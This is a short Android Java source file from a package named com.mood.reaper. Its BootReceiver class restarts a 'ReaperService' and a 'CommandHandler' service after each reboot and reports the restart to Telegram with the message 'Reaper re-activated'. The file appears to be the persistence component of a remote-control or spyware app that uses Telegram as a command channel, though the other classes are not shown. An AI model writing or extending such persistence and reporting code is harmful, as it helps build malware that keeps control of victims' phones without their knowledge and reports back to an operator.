package com.mood.reaper;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            context.startService(new Intent(context, ReaperService.class));
            context.startService(new Intent(context, CommandHandler.class));
            Utils.sendToTelegram("📱 Device reboot detected - Reaper re-activated");
        }
    }
}